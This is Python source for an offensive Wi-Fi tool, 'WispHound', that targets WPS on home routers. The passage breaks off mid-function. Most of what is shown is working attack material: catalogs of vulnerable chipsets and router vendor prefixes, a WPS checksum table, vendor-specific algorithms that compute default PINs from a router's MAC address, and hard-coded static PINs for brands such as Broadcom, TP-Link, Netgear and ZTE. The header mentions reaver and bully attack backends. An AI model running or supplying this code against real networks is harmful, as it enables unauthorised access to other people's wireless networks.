#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WispHound 2.1.2 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.

Changes vs 2.1.0:
  * Pluggable Backends: 'reaver' and 'bully' alongside internal wpa_supplicant.
  * Expanded Chipset Catalog (60+ signatures) and OUI Catalog (50+ prefixes).
  * Channel & Frequency Tracking for 2.4/5/6 GHz; surfaced in tables, passed to reaver/bully (-c).
  * Monitor Mode Management via airmon-ng or native iw/ip.

Changes vs 2.1.1 (fixes the "No networks found." regression):
  * REMOVED `iw ... scan --all` — that flag is a debug-dump toggle, not a band
    expander, and is rejected by many Kali iw builds (`Invalid argument`),
    which made iw_scanner() return False before parsing anything.
  * REMOVED the `networks = [n for n in networks if n['WPS']]` filter.
    Every visible AP (2.4/5/6 GHz) is now listed. WPS status is annotated
    in a dedicated column; non-WPS rows are grey and selectable.
  * Sort is fully .get()-based so a malformed beacon cannot raise KeyError.
  * prompt_network() warns about non-WPS targets but no longer blocks them.
  * The main-loop guard still refuses to *attack* a non-WPS AP (reaver,
    bully and WPS_REG all require WPS) and tells the user why.
"""
import argparse
import codecs
import collections
import csv
import json
import os
import pathlib
import re
import shutil
import signal
import socket
import sqlite3
import statistics
import subprocess
import sys
import tempfile
import time
from array import array
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional

try:
    import wcwidth
except ImportError:                                    # graceful degrade
    class _WC:
        @staticmethod
        def wcswidth(s):
            return len(s)
    wcwidth = _WC()


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
VERSION = '2.1.2'


def _graceful_exit_handler(signum, frame):
    raise KeyboardInterrupt

for _sig_name in ('SIGTERM', 'SIGHUP'):
    if hasattr(signal, _sig_name):
        try:
            signal.signal(getattr(signal, _sig_name), _graceful_exit_handler)
        except (ValueError, OSError):
            pass


PIXIE_VULNERABLE_CHIPSETS = {
    # Ralink / MediaTek — RT series
    'RT2860': 'Ralink RT2860', 'RT2870': 'Ralink RT2870',
    'RT3050': 'Ralink RT3050', 'RT3052': 'Ralink RT3052',
    'RT3070': 'Ralink RT3070', 'RT3090': 'Ralink RT3090',
    'RT3290': 'Ralink RT3290', 'RT3352': 'Ralink RT3352',
    'RT3572': 'Ralink RT3572', 'RT5350': 'Ralink RT5350',
    'RT5370': 'Ralink RT5370', 'RT5372': 'Ralink RT5372',
    'RT5390': 'Ralink RT5390', 'RT5592': 'Ralink RT5592',
    # Ralink / MediaTek — MT series
    'MT7601': 'MediaTek MT7601', 'MT7603': 'MediaTek MT7603',
    'MT7610': 'MediaTek MT7610', 'MT7612': 'MediaTek MT7612',
    'MT7615': 'MediaTek MT7615', 'MT7620': 'MediaTek MT7620',
    'MT7628': 'MediaTek MT7628', 'MT7688': 'MediaTek MT7688',
    # Realtek — RTL8xxx
    'RTL8186': 'Realtek RTL8186', 'RTL8188': 'Realtek RTL8188',
    'RTL8192': 'Realtek RTL8192', 'RTL8196': 'Realtek RTL8196',
    'RTL8197': 'Realtek RTL8197', 'RTL8723': 'Realtek RTL8723',
    'RTL8811': 'Realtek RTL8811', 'RTL8812': 'Realtek RTL8812',
    'RTL8814': 'Realtek RTL8814', 'RTL8821': 'Realtek RTL8821',
    'RTL8822': 'Realtek RTL8822',
    # Broadcom — BCM43xx
    'BCM4312': 'Broadcom BCM4312', 'BCM4313': 'Broadcom BCM4313',
    'BCM4318': 'Broadcom BCM4318', 'BCM4321': 'Broadcom BCM4321',
    'BCM4322': 'Broadcom BCM4322', 'BCM4325': 'Broadcom BCM4325',
    'BCM4329': 'Broadcom BCM4329', 'BCM4331': 'Broadcom BCM4331',
    'BCM4352': 'Broadcom BCM4352', 'BCM4360': 'Broadcom BCM4360',
    'BCM43142': 'Broadcom BCM43142', 'BCM43224': 'Broadcom BCM43224',
    'BCM43225': 'Broadcom BCM43225', 'BCM43227': 'Broadcom BCM43227',
    'BCM43228': 'Broadcom BCM43228',
    # Atheros / Qualcomm — AR9xxx, QCA
    'AR7240': 'Atheros AR7240', 'AR7241': 'Atheros AR7241',
    'AR7242': 'Atheros AR7242', 'AR9220': 'Atheros AR9220',
    'AR9271': 'Atheros AR9271', 'AR9280': 'Atheros AR9280',
    'AR9281': 'Atheros AR9281', 'AR9283': 'Atheros AR9283',
    'AR9285': 'Atheros AR9285', 'AR9287': 'Atheros AR9287',
    'AR9331': 'Atheros AR9331', 'AR9340': 'Atheros AR9340',
    'AR9341': 'Atheros AR9341', 'AR9342': 'Atheros AR9342',
    'AR9344': 'Atheros AR9344', 'AR9382': 'Atheros AR9382',
    'AR9462': 'Atheros AR9462', 'AR9485': 'Atheros AR9485',
    'AR9550': 'Atheros AR9550', 'AR9580': 'Atheros AR9580',
    'QCA9533': 'Qualcomm QCA9533', 'QCA9550': 'Qualcomm QCA9550',
    'QCA9558': 'Qualcomm QCA9558', 'QCA9563': 'Qualcomm QCA9563',
    'QCA9880': 'Qualcomm QCA9880', 'QCA9882': 'Qualcomm QCA9882',
    'QCA9890': 'Qualcomm QCA9890',
    # Marvell
    '88W8363': 'Marvell 88W8363', '88W8366': 'Marvell 88W8366',
    '88W8764': 'Marvell 88W8764', '88W8864': 'Marvell 88W8864',
    '88W8897': 'Marvell 88W8897',
    # Lantiq / Intel XWAY
    'PSB6970': 'Lantiq PSB6970', 'PEB6024': 'Lantiq PEB6024',
    'XWAY': 'Lantiq XWAY', 'GRX300': 'Lantiq GRX300',
    # ZyDAS / Conexant
    'ZD1211': 'ZyDAS ZD1211', 'ZD1211B': 'ZyDAS ZD1211B',
    'CX82310': 'Conexant CX82310',
    # Celeno
    'CL1800': 'Celeno CL1800', 'CL1900': 'Celeno CL1900',
}

OUI_BUILTIN = {
    '0014D1': 'TRENDnet', '00904C': 'Epigram/Broadcom',
    'D4BF7F': 'Upvel', 'F8C091': 'Upvel',
    '0026CE': 'Onlime', '00664B': 'Huawei',
    '0023F8': 'Zyxel', 'C83A35': 'Tenda',
    '001CDF': 'Belkin', '002275': 'Belkin',
    '5C353B': 'Compal (CBN)', 'DC537C': 'Compal (CBN)',
    '0018E7': 'Cameo', '001AA9': 'Fujitsu',
    '200BC7': 'Ralink/MediaTek', '4846FB': 'Ralink/MediaTek',
    'D46AA8': 'Ralink/MediaTek', 'F84ABF': 'Ralink/MediaTek',
    '00E04C': 'Realtek', '00E04B': 'Realtek',
    '10BEF5': 'D-Link', 'CCB255': 'D-Link',
    '1C7EE5': 'D-Link', '28107B': 'D-Link',
    '84C9B2': 'D-Link', 'B8A386': 'D-Link',
    'FC7516': 'D-Link', 'A0AB1B': 'D-Link',
    '14D64D': 'D-Link', 'C0A0BB': 'D-Link',
    '5CD998': 'D-Link', '340804': 'D-Link',
    '9094E4': 'TP-Link', 'EC086B': 'TP-Link',
    '1062EB': 'TP-Link', '1C5F2B': 'TP-Link',
    '802689': 'TP-Link', '908D78': 'TP-Link',
    'E8CC18': 'TP-Link', 'D8FEE3': 'TP-Link',
    '50465D': 'ASUSTek', '10BF48': 'ASUSTek',
    '049226': 'ASUSTek', '04D9F5': 'ASUSTek',
    '08606E': 'ASUSTek', '2CFDA1': 'ASUSTek',
    '107B44': 'ASUSTek', '10C37B': 'ASUSTek',
    '1CB72C': 'ASUSTek', '382C4A': 'ASUSTek',
    '40167E': 'ASUSTek', '90F652': 'ASUSTek',
    'AC9E17': 'ASUSTek', 'BCEE7B': 'ASUSTek',
    '60A44C': 'ASUSTek', '704D7B': 'ASUSTek',
    '7824AF': 'ASUSTek', 'D017C2': 'ASUSTek',
    '1C872C': 'ASUSTek', '2C56DC': 'ASUSTek',
    'C86000': 'ASUSTek',
    '788102': 'Sercomm', '7894B4': 'Sercomm',
    '0022B0': 'D-Link', '001CF0': 'D-Link',
    'C8BE19': 'TP-Link', 'C8D3A3': 'TP-Link',
    '7C034C': 'Netgear', '204E7F': 'Netgear',
    '4C17EB': 'Netgear', '18622C': 'Netgear',
    '7C03D8': 'Netgear', 'D86CE9': 'Netgear',
    'A01B29': 'Netgear', 'E0469A': 'Netgear',
    '9CD643': 'D-Link', '68A0F6': 'D-Link',
    '0C96BF': 'Huawei', '20F3A3': 'Huawei',
    'ACE215': 'Huawei', 'C8D15E': 'Huawei',
    'E8CD2D': 'Huawei', 'F80113': 'Huawei',
    '087A4C': 'Huawei', '14B968': 'Huawei',
    '2008ED': 'Huawei', '346BD3': 'Huawei',
    '786A89': 'Huawei', '88E3AB': 'Huawei',
    '7071BC': 'Cisco', 'E06995': 'Cisco',
    '001A2B': 'Cisco', '00248C': 'Cisco',
    '002618': 'Cisco', '344DEB': 'Cisco',
    'EC6264': 'Broadcom', '988B5D': 'Broadcom',
    '14144B': 'Broadcom', 'BCF685': 'Broadcom',
    '002624': 'Thomson', '4432C8': 'Thomson',
    '88F7C7': 'Thomson', 'CC03FA': 'Thomson',
    '4C09B4': 'ZTE', '4CAC0A': 'ZTE',
    '9CD24B': 'ZTE', 'DC028E': 'ZTE',
    'FCC897': 'ZTE', 'B075D5': 'ZTE',
    'C864C7': 'ZTE', '84742A': 'ZTE',
    '784476': 'Upvel',
    '08C6B3': 'Realtek',
    '007263': 'Realtek',
}


# ---------------------------------------------------------------------------
# Checksum lookup table
# ---------------------------------------------------------------------------
def _build_checksum_table():
    table = array('b', [0]) * 10_000_000
    for i in range(10_000_000):
        p, accum = i, 0
        while p:
            accum += 3 * (p % 10)
            p //= 10
            accum += p % 10
            p //= 10
        table[i] = (10 - accum % 10) % 10
    return table


def get_hex(line):
    parts = line.split(':', 3)
    if len(parts) < 3:
        return ''
    return parts[2].replace(' ', '').upper()


def recvuntil(pipe, what, timeout=30):
    s = ''
    start = time.time()
    while True:
        if time.time() - start > timeout:
            return s
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


# ---------------------------------------------------------------------------
# NetworkAddress
# ---------------------------------------------------------------------------
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, NetworkAddress):
            self._int_repr = mac._int_repr
            self._str_repr = mac._str_repr
        elif isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(self._str_repr)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer = self.integer + int(other)
        return self

    def __isub__(self, other):
        self.integer = self.integer - int(other)
        return self

    def _coerce(self, other):
        if isinstance(other, NetworkAddress):
            return other.integer
        try:
            return NetworkAddress(other).integer
        except (ValueError, AttributeError):
            return NotImplemented

    def __eq__(self, other):
        v = self._coerce(other)
        return NotImplemented if v is NotImplemented else self.integer == v

    def __ne__(self, other):
        v = self._coerce(other)
        return NotImplemented if v is NotImplemented else self.integer != v

    def __lt__(self, other):
        return self.integer < self._coerce(other)

    def __gt__(self, other):
        return self.integer > self._coerce(other)

    def __hash__(self):
        return hash(self._int_repr)

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        s = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(s[i:i+2] for i in range(0, 12, 2))

    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'


# ---------------------------------------------------------------------------
# WPSpin
# ---------------------------------------------------------------------------
class WPSpin:
    ALGO_MAC = 0
    ALGO_EMPTY = 1
    ALGO_STATIC = 2

    _CHECKSUM_TABLE = None

    def __init__(self):
        self._pin_cache = {}
        self.algos = {
            'pin24':       {'name': '24-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin24},
            'pin28':       {'name': '28-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin28},
            'pin32':       {'name': '32-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin32},
            'pinDLink':    {'name': 'D-Link PIN',        'mode': self.ALGO_MAC,    'gen': self.pinDLink},
            'pinDLink1':   {'name': 'D-Link PIN +1',     'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
            'pinASUS':     {'name': 'ASUS PIN',          'mode': self.ALGO_MAC,    'gen': self.pinASUS},
            'pinAirocon':  {'name': 'Airocon Realtek',   'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
            'pinInvNIC':   {'name': 'Inverted NIC',      'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
            'pinNIC2':     {'name': 'NIC x2',            'mode': self.ALGO_MAC,    'gen': self.pinNIC2},
            'pinNIC3':     {'name': 'NIC x3',            'mode': self.ALGO_MAC,    'gen': self.pinNIC3},
            'pinOUIaddNIC':{'name': 'OUI+NIC sum',       'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
            'pinOUIxorNIC':{'name': 'OUI^NIC xor',       'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},
            'pinEmpty':    {'name': 'Empty PIN',         'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
            'pinCisco':    {'name': 'Cisco',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1':    {'name': 'Broadcom 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2':    {'name': 'Broadcom 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3':    {'name': 'Broadcom 3',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4':    {'name': 'Broadcom 4',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5':    {'name': 'Broadcom 5',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6':    {'name': 'Broadcom 6',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1':    {'name': 'Airocon 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2':    {'name': 'Airocon 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel':    {'name': 'Upvel',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC':  {'name': 'UR-814AC',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC':  {'name': 'UR-825AC',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime':   {'name': 'Onlime',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax':   {'name': 'Edimax',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson':  {'name': 'Thomson',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x':   {'name': 'HG532x',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L':    {'name': 'H108L',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO':      {'name': 'CBN ONO',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
            'pinTenda':    {'name': 'Tenda',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1296051},
            'pinTPLink1':  {'name': 'TP-Link 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinTPLink2':  {'name': 'TP-Link 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 5765498},
            'pinNetgear1': {'name': 'Netgear 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinNetgear2': {'name': 'Netgear 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinZTE1':     {'name': 'ZTE 1',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinZTE2':     {'name': 'ZTE 2',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
        }

    @staticmethod
    def checksum(pin):
        if WPSpin._CHECKSUM_TABLE is None:
            WPSpin._CHECKSUM_TABLE = _build_checksum_table()
        try:
            pin = int(pin)
        except (TypeError, ValueError):
            return 0
        if 0 <= pin < 10_000_000:
            return WPSpin._CHECKSUM_TABLE[pin]
        accum = 0
        while pin:
            accum += 3 * (pin % 10); pin //= 10
            accum += pin % 10;       pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        key = (algo, str(mac))
        if key in self._pin_cache:
            return self._pin_cache[key]
        mac = mac if isinstance(mac, NetworkAddress) else NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            result = pin
        else:
            pin = pin % 10000000
            result = (str(pin) + str(self.checksum(pin))).zfill(8)
        self._pin_cache[key] = result
        return result

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            prefix = 'Static PIN — ' if algo['mode'] == self.ALGO_STATIC else ''
            res.append({'id': ID, 'name': prefix + algo['name'],
                        'pin': self.generate(ID, mac)})
        return res

    def getList(self, mac, get_static=True):
        return [self.generate(ID, mac)
                for ID, algo in self.algos.items()
                if get_static or algo['mode'] != self.ALGO_STATIC]

    def getSuggested(self, mac):
        res = []
        for ID in self._suggest(mac):
            algo = self.algos[ID]
            prefix = 'Static PIN — ' if algo['mode'] == self.ALGO_STATIC else ''
            res.append({'id': ID, 'name': prefix + algo['name'],
                        'pin': self.generate(ID, mac)})
        return res

    def getSuggestedUnique(self, mac):
        seen, out = set(), []
        for item in self.getSuggested(mac):
            if item['pin'] in seen:
                continue
            seen.add(item['pin'])
            out.append(item)
        return out

    def getSuggestedList(self, mac):
        return [self.generate(a, mac) for a in self._suggest(mac)]

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        return res[0] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E',
                     'EC086B','6C198F','B0487A','C0C1C0','3C46D8','0023CD','A42B8C','3894ED','B0C745',
                     '6466B3','2C4D54','1008B1','143005','E4F4C6','1C3BF3','F4F26D','848E96','109FA9',
                     'F0A731','00DBDF','4027F5','101250','50B7C3','CC32E5','D4B167','E84DD0','FC3514'),
            'pin28': ('200BC7','4846FB','D46AA8','F84ABF',
                      '74DA88','C46E1F','0C726D','CC9F7A','7C8BCA','44A56E'),
            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02',
                      'EC086B','1C872C','B06EBF','3085A9','AC220B','D017C2','6045CB','74D02B','D850E6'),
            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97',
                         '1CAFF7','3C1E04','10BEF5','78321B','C4A81D','908D78','F07D68','346BD3','6C198F'),
            'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1',
                          '1CAFF7','3C1E04','10BEF5','78321B','F07D68','281878','C4E984'),
            'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4',
                        '2420C7','1C872C','50465D','04421A','D45D64','70825E','3C7C3F','FCECDA','3497F6',
                        '60A44C','88D7F6','382C4A','1CB72C','2C56DC','AC9E17','B06EBF','40167E','9C5C8E',
                        'F46BEF','A8F7E0','BCEE7B','E03F49','D017C2','F832E4','54A050','708105','AC2205'),
            'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97',
                           'D084B0','84A423','8C10D4','E4BEED','B85510','C891F9','3C1E04','40F201','181E78'),
            'pinInvNIC': ('00904C','EC6264','14144B','988B5D','001AA9','ACF1DF','BCF685',
                          '00E04C','001CDF','002275','C83A35','B4944E'),
            'pinNIC2': ('D4BF7F','F8C091','784476','0014D1','144D67'),
            'pinNIC3': ('F8C091','D4BF7F','784476'),
            'pinOUIaddNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685',
                             '00E04C','08C6B3','007263','000C42','000EE8'),
            'pinOUIxorNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685'),
            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C',
                         'F0B429','741EA2','D4214D','E0E751','2C39C1','0C54A5','78C1A7','6C72E7',
                         'D8EB46','7442C1','B0B98A','F85E42','30B5C2','C8D719','240995','18A6F7'),
            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5',
                         '0023BE','002369','0025B3','000F8F','0012D9','001217','00182A','000625',
                         '00166F','001839','001A70','001C10','001E4A','002163','006B4F'),
            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264',
                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19',
                         '20E52A','3CA72B','E44790'),
            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C',
                         '20E52A','3CA72B','E44790'),
            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
            'pinAirc1': ('181E78','40F201','44E9DD','D084B0',
                         '84A423','8C10D4','3C1E04'),
            'pinAirc2': ('84A423','8C10D4','88A6C6',
                         '181E78','40F201','44E9DD'),
            'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516',
                            '1CAFF7','78321B','F07D68','C4A81D'),
            'pinRealtek1': ('0014D1','000C42','000EE8',
                            '00E04C','E4BEED','08C6B3','007263','B85510'),
            'pinRealtek2': ('007263','E4BEED',
                            '00E04C','0014D1','08C6B3'),
            'pinRealtek3': ('08C6B3',
                            '00E04C','007263','E4BEED'),
            'pinUpvel': ('784476','D4BF7F0','F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
            'pinEdimax': ('801F02','00E04C',
                          '74DA38','80D01D','00E04C'),
            'pinThomson': ('002624','4432C8','88F7C7','CC03FA',
                           'BC7670','7822DF','782E29','FC946C','A0F3C1','64680C','04FE31'),
            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF',
                          '4C8BEF','4CB16C','C8D15E','D46E5C','EC233D','ECCB30','F49FF3','2008ED',
                          '007822','00259E','001882','00E0FC','001E10','0019CB','006331','78D99F'),
            'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897',
                         'E068E7','5CE286','CC7B35','84A8E4','C864C7','18C58A','4C09B4','44F436',
                         '00265E','002293','002662','741F4A','283B82','74A063'),
            'pinONO': ('5C353B','DC537C',
                       'E0CA94','1C3991','40167E','5853AF'),
            'pinTenda': ('C83A35','001CC3','D85D4C','B0B2DC','CC5D4E','9C216A','BCDAFE','EC26CA',
                         '28EE52','C4F0EC','D021FA','302481','58605F','808132','A4F4C2','F42896'),
            'pinTPLink1': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332',
                           '9094E4','5C899A','14CF92','6CE873','2C4D54','640DE6','B4B024','B0C745',
                           '3C46D8','1C3BF3','AC84C6','F0A731','ECA940','D8075A'),
            'pinTPLink2': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332',
                           'D8075A','ECA940','AC84C6','640DE6','B4B024'),
            'pinNetgear1': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E46F13','E0469A','300D43',
                            '001E2A','001B2F','001F33','002636','008EF2','20E52A','2CB05D','3CA72B',
                            'C43DC7','C8B373','E44790','F87394','CC40D0','6CB0CE','A42B8C','6CDA23'),
            'pinNetgear2': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E0469A','300D43',
                            '001E2A','001B2F','20E52A','3CA72B','C43DC7','C8B373','E44790'),
            'pinZTE1': ('4C09B4','4CAC0A','9CD24B','B075D5','C864C7','DC028E','FCC897',
                        'E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','283B82'),
            'pinZTE2': ('4C09B4','4CAC0A','9CD24B','C864C7','DC028E','FCC897',
                        'E068E7','CC7B35','84A8E4','18C58A'),
        }
        res = []
        for algo_id, masks in algorithms.items():
            for mask in masks:
                if mac.startswith(mask):
                    res.append(algo_id)
                    break
        return res

    def pin24(self, mac):   return mac.integer & 0xFFFFFF
    def pin28(self, mac):   return mac.integer & 0xFFFFFFF
    def pin32(self, mac):   return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) + ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(1e6)
        if pin < int(1e5):
            pin += ((pin % 9) * int(1e5)) + int(1e5)
        return pin

    def pinDLink1(self, mac):
        m = NetworkAddress(mac)
        m.integer += 1
        return self.pinDLink(m)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        digits = []
